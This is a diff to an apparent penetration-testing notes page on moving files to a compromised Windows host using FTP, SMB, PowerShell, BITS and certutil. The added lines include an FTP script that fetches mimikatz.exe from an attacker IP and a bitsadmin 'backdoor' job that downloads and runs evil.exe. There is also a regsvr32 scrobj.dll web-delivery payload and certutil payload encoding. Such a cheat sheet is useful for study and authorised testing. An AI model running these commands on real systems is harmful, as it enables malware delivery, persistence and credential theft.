@@ -419,9 +419,22 @@ bye
 
 Then you can simply run `ftp -s:ftp_commands.txt` and download a file with no user interaction.  Use **`-i`** to disable interactive prompting during multiple file transfers.
 
-#### FTP **batch script example**
+#### FTP **batch script examples**
 
+```batch
+#Work well with python. With pure-ftp use fusr:ftp
+echo open 10.10.10.1 21 > ftp.txt
+echo USER anonymous >> ftp.txt
+echo anonymous >> ftp.txt
+echo bin >> ftp.txt
+echo GET mimikatz.exe >> ftp.txt
+echo bye >> ftp.txt
+ftp -n -v -s:ftp.txt
 ```
+
+or
+
+```batch
 echo "open <IP>" > ftp_commands.txt
 echo "username" >> ftp_commands.txt
 echo "password" >> ftp_commands.txt
@@ -436,6 +449,55 @@ ftp -s:ftp_commands.txt
 ```
 
 Use "**`Get`**" if downloading, or "**`Put`**" if uploading.&#x20;
+
+### SMB
+
+#### First, create an SMB share using Impacket
+
+```bash
+impacket-smbserver -smb2support kali `pwd` # Share current directory
+smbserver.py -smb2support name /path/folder # or share a specific folder
+
+#For new Win10 versions you must specify credentials
+impacket-smbserver -smb2support -user test -password test test `pwd`
+```
+
+#### Or create an SMB share using samba:
+
+```bash
+apt install samba
+mkdir /tmp/smb
+chmod 777 /tmp/smb
+```
+
+Then add the following to the end of `/etc/samba/smb.conf`:&#x20;
+
+```bash
+[public]
+    comment = Samba on Ubuntu
+    path = /tmp/smb
+    read only = no
+    browsable = yes
+    guest ok = Yes
+```
+
+Finally (re)start the Samba server
+
+```
+service smbd restart
+```
+
+#### Transfer files to/from the Windows victim
+
+Connect to the remote share with `net.exe`
+
+```
+net use z: \\10.10.10.1\test /user:test test
+```
+
+Or using the `New-PSDrive` PowerShell cmdlet
+
+<pre class="language-powershell"><code class="lang-powershell"><strong>New-PSDrive -Name "z" -PSProvider "FileSystem" -Root "\\10.10.10.1\test"</strong></code></pre>
 
 ### Download files with PowerShell
 
@@ -475,15 +537,64 @@ $task.wait();
 
 ### **Using Bitsadmin**
 
+{% tabs %}
+{% tab title="PowerShell" %}
+First, you must import the BitsTransfer PowerShell Module with `Import-Module BitsTransfer`.  After you import the BitsTransfer module, the following cmdlets are available:
+
+* **`Add-BitsFile`** Adds files to a BITS transfer
+* **`Complete-BitsTransfer`** Completes a BITS transfer
+* **`Get-BitsTransfer`** Gets a BITS transfer
+* **`Remove-BitsTransfer`** Stops a BITS transfer
+* **`Resume-BitsTransfer`** Resumes a suspended BITS transfer
+* **`Set-BitsTransfer`** Configures a BITS transfer job
+* **`Start-BitsTransfer`** Creates and starts a BITS transfer job
+* **`Suspend-BitsTransfer`** Pauses a BITS transfer job
+
+For example, the following Windows PowerShell command begins a BITS transfer from the local computer to a computer named CLIENT:
+
+```powershell
+Start-BitsTransfer -Source file.txt -Destination \\client\share -Priority normal
+```
+
+When running Windows PowerShell interactively, the PowerShell window displays the progress of the transfer. The following command uses an abbreviated notation to download a file from a Web site to the local computer:
+
+```powershell
+Start-BitsTransfer https://server/dir/myfile.txt C:\docs\myfile.txt
+```
+
+****[**Microsoft**](https://docs.microsoft.com/en-us/previous-versions/technet-magazine/ff382721\(v=msdn.10\))****
+{% endtab %}
+
+{% tab title="cmd.exe" %}
+```
+bitsadmin /create backdoor
+bitsadmin /addfile backdoor "http://10.10.10.10/evil.exe"  "C:\tmp\evil.exe"
+
+# v1
+bitsadmin /SetNotifyCmdLine backdoor C:\tmp\evil.exe NUL
+bitsadmin /SetMinRetryDelay "backdoor" 60
+bitsadmin /resume backdoor
+
+# v2 - exploit/multi/script/web_delivery
+bitsadmin /SetNotifyCmdLine backdoor regsvr32.exe "/s /n /u /i:http://10.10.10.10:8080/FHXSd9.sct scrobj.dll"
+bitsadmin /resume backdoor
+```
+
 ```
 bitsadmin /transfer WindowsUpdate /download /priority normal http:///$ip/$file C:\\Users\\%USERNAME%\\AppData\\local\\temp\\$file
 ```
+{% endtab %}
+{% endtabs %}
 
 ### **Using Certutil**
+
+The basic syntax for downloading a file:
 
 ```
 certutil.exe -urlcache -split -f "http://$ip/$file" $file
 ```
+
+You can also use syntax as below to create .bat scripts:
 
 ```bash
 set url=https://www.nsa.org/content/hl-images/2017/02/09/NSA.jpg
@@ -491,6 +602,13 @@ set file=file.jpg
 certutil -urlcache -split -f %url% %file%
 #Or
 certutil.exe -verifyctl -f -split %url% %file%
+```
+
+You can also use `certutil` to encode and decode a payload:
+
+```
+certutil -encode payload.dll payload.b64
+certutil -decode payload.b64 payload.dll
 ```
 
 ### Using Microsoft Defender MpCmdRun.exe
